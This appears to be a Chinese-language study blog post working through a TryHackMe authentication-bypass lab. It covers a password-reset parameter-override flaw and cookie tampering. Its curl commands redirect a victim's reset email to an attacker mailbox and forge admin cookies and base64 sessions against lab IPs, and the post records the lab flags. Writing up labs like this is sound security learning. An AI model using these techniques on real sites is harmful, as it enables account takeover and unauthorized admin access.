+<p>在重置电子邮件过程的第二步中，用户名会通过 POST 字段提交到 Web 服务器，而电子邮件地址在查询字符串请求中会作为 GET 字段发送。</p>
+<p>让我们通过使用 curl 工具手动向网络服务器发出请求来说明这一点。</p>
+<p><em><strong>Curl Request 1</strong></em></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%40 是 @ 字符的url编码形式，可以使用url编码工具来验证</span></span><br><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl <span class="string">&#x27;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="string">&#x27;username=robert&#x27;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>我们使用<code>-H</code>标志向请求消息添加额外的标头。 在本例中，我们会将 <code>Content-Type</code> 设置为 <code>application/x-www-form-urlencoded</code>，这能让 Web 服务器知道我们正在发送表单数据，以便Web服务器能够正确理解我们的请求消息。</p>
+<p>在以上示例的web应用程序中，网站将使用查询字符串来检索用户帐户，检索完成之后，根据应用程序的逻辑，该网站将使用 PHP 变量<code>$_REQUEST</code>中的数据来发送密码重置电子邮件。</p>
+<p>该网站的PHP代码中的<code>$_REQUEST</code>变量是一个数组，其中包含了从查询字符串接收的数据和 POST 数据。 如果查询字符串和 POST 数据使用相同的键名，则此变量的应用程序逻辑将倾向于 POST 数据字段而不是查询字符串数据字段，因此如果我们在 POST 表单中添加另一个<code>email</code>参数，我们就可以控制 关于密码重置的电子邮件 的送达位置。</p>
+<p><em><strong>Curl Request 2</strong></em></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl <span class="string">&#x27;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="string">&#x27;username=robert&amp;email=attacker@hacker.com&#x27;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111170742660.png"
+                      alt="image-20221111170742660"
+                ></p>
+<p>接下来，我们需要在 Acme IT Support 的客户页面创建一个帐户，这样做会为我们提供一个唯一的电子邮件地址，可用于创建该网站提供的<em><strong>技术支持业务票据</strong></em>，电子邮件地址的格式为 <code>&#123;username&#125;@customer.acmeitsupport.thm</code>。</p>
+<p>现在重新运行 <em><strong>Curl Request 2</strong></em>，但在电子邮件字段中使用我们自己的<code>@customer.acmeitsupport.thm</code>，然后在你的帐户上会生成一张业务票据，其中会包含一个链接，结果就是你能以 Robert 的身份实现登录并能查看Robert 用户的账户信息。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@tryhackme:~$ curl &#x27;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=&#123;username&#125;@customer.acmeitsupport.thm&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111181051000.png"
+                      alt="image-20221111181051000"
+                ></p>
+<p>在目标站点的注册页注册一个账户：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111175641057.png"
+                      alt="image-20221111175641057"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111174923668.png"
+                      alt="image-20221111174923668"
+                ></p>
+<blockquote>
+<p>hacker</p>
+<p><a class="link"   href="mailto:&#x68;&#97;&#99;&#107;&#x65;&#114;&#64;&#x63;&#x75;&#x73;&#116;&#x6f;&#109;&#101;&#x72;&#46;&#97;&#99;&#x6d;&#x65;&#105;&#x74;&#115;&#117;&#112;&#112;&#111;&#114;&#116;&#x2e;&#x74;&#104;&#109;" >&#x68;&#97;&#99;&#107;&#x65;&#114;&#64;&#x63;&#x75;&#x73;&#116;&#x6f;&#109;&#101;&#x72;&#46;&#97;&#99;&#x6d;&#x65;&#105;&#x74;&#115;&#117;&#112;&#112;&#111;&#114;&#116;&#x2e;&#x74;&#104;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>在攻击机上使用curl命令：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://10.10.68.98/customers/reset?email=robert@acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=hacker@customer.acmeitsupport.thm&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111180303817.png"
+                      alt="image-20221111180303817"
+                ></p>
+<p>在目标站点的hacker用户页面查看消息（点击id号查看详情）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111180434042.png"
+                      alt="image-20221111180434042"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111180703383.png"
+                      alt="image-20221111180703383"
+                ></p>
+<p>成功登录到用户robert：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111180918193.png"
+                      alt="image-20221111180918193"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111181014808.png"
+                      alt="image-20221111181014808"
+                ></p>
+<blockquote>
+<p>THM{AUTH_BYPASS_COMPLETE}</p>
+</blockquote>
+<h2 id="Cookie篡改"><a href="#Cookie篡改" class="headerlink" title="Cookie篡改"></a>Cookie篡改</h2><p>在你的在线会话期间检查和编辑由 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、对其他用户帐户的访问或获得一个提升的权限。</p>
+<p><strong>Cookie-Plain Text（明文）</strong></p>
+<p>一些cookies的内容可以是纯文本的，它们的作用是显而易见的。 例如，假设以下是成功登录后所设置的cookie信息：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111183108914.png"
+                      alt="image-20221111183108914"
+                ></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: logged_in=true; Max-Age=3600; Path=/</span><br><span class="line">Set-Cookie: admin=false; Max-Age=3600; Path=/</span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以看到一个 cookie (logged_in)，它似乎控制着用户当前是否登录，还有另一个cookie (admin)，它控制着访问者是否具有管理员权限。 按照这个逻辑，如果我们更改了 cookie 的内容并重新发出请求，那么我们将能够更改我们拥有的权限。</p>
+<p>首先，我们将从请求目标页面开始：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl http://10.10.68.98/cookie-test</span></span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以看到返回了一条消息：未登录–<strong>Not Logged In</strong></p>
+<p>现在我们将发送另一个请求，并将<code>logged_in</code> cookie设置为<code>true</code>，将<code>admin</code> cookie设置为<code>false</code>：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl -H <span class="string">&quot;Cookie: logged_in=true; admin=false&quot;</span> http://10.10.68.98/cookie-test</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这次我们能够收到消息：以用户身份登录–<strong>Logged In As A User</strong></p>
+<p>最后，我们将发送又一个请求，将 <code>logged_in</code> 和 <code>admin</code> cookie 都设置为<code>true</code>：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">user@tryhackme$ </span><span class="language-bash">curl -H <span class="string">&quot;Cookie: logged_in=true; admin=true&quot;</span> http://10.10.68.98/cookie-test</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这将返回结果：以管理员身份登录– <strong>Logged In As An Admin</strong></p>
+<p><strong>Cookie-Hashing（散列）</strong></p>
+<p>有时 cookie 值可能看起来像一长串随机字符，这些字符被称为散列，是原始文本内容的不可逆表示。 以下是你可能会遇到的一些hash示例：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111194755762.png"
+                      alt="image-20221111194755762"
+                ></p>
+<p>从上表可以看出，输入同一字符串再经过hash算法处理而输出的hash值 可能会因使用的哈希算法不同而有显著不同的结果。 </p>
+<p>即使哈希是不可逆的，但同一字符每次经同一hash算法处理之后都会产生相同的输出结果，这对我们破解hash值很有帮助，因为 <a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/" >https://crackstation.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 等在线网站存在一个保留了数十亿哈希值及其原始字符串的数据库。</p>
+<p><strong>Cookie-Encoding（编码）</strong></p>
+<p>编码类似于散列，因为它也会创建看似随机的文本字符串，但实际上，编码是可逆的。 这就引出了一个问题，编码有什么意义？ 编码允许我们将二进制数据转换为人类可读的文本，这些文本内容可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。</p>
+<p>常见的编码类型有<code>base32</code>能将二进制数据转换为字符 A-Z 和 2-7，以及<code>base64</code>使用字符 a-z、A-Z、0-9、+、&#x2F; 和等号进行填充转换。</p>
+<p>以web服务器登录时设置的以下数据为例：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/</span><br></pre></td></tr></table></figure></div>
+
+<p>以上编码部分的数据经过<code>base64</code>解码之后的字符串的值为 <code>&#123;&quot;id&quot;:1,&quot;admin&quot;: false&#125;</code> ，我们可以将其重新编码回 <code>base64</code> 编码，但是我们将 <code>admin</code> 值设置为 <code>true</code>，然后我们就可以获得管理员访问权限。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111203851685.png"
+                      alt="image-20221111203851685"
+                ></p>
+<p>发送一个请求，将 <code>logged_in</code> 和 <code>admin</code> cookie 都设置为<code>true</code>：</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;Cookie: logged_in=true; admin=true&quot; http://10.10.68.98/cookie-test</span><br></pre></td></tr></table></figure></div>
+
+<p>返回结果：<strong>Logged In As An Admin</strong>以及 <strong>flag</strong> 内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111202637152.png"
+                      alt="image-20221111202637152"
+                ></p>
+<blockquote>
+<p>THM{COOKIE_TAMPERING}</p>
+</blockquote>
+<p>使用在线网站破解hash值：<a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/" >https://crackstation.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111203107286.png"
+                      alt="image-20221111203107286"
+                ></p>
+<blockquote>
+<p>结果：463729</p>
+</blockquote>
+<p>使用在线网站完成base64解码和编码：<a class="link"   target="_blank" rel="noopener" href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111203412707.png"
+                      alt="image-20221111203412707"
+                ></p>
+<blockquote>
+<p>结果：THM{BASE64_ENCODING}</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221111203816239.png"
+                      alt="image-20221111203816239"
+                ></p>
+<blockquote>
+<p>结果：eyJpZCI6MSwiYWRtaW4iOnRydWV9</p>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> THM-Authentication Bypass(身份验证绕过)-学习</li>
+        <li><strong>Author:</strong> Hekeatsll</li>
+        <li><strong>Created at
+                :</strong> 2024-01-27 11:56:55</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-01-27 11:58:34
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://hekeatsll.github.io/2024/01/27/THM-Authentication Bypass(身份验证绕过)-学习/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/TryHackMe/">#TryHackMe</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/">#Web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/01/27/THM-IDOR(%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8)-%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">THM-IDOR(不安全的直接对象引用)-学习</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/01/27/THM-Subdomain%20Enumeration(%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE)-%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">THM-Subdomain Enumeration(子域名枚举)-学习</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">THM-Authentication Bypass(身份验证绕过)-学习</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-text">用户名枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB"><span class="nav-text">暴力破解攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7"><span class="nav-text">逻辑缺陷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookie%E7%AF%A1%E6%94%B9"><span class="nav-text">Cookie篡改</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Hekeatsll</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
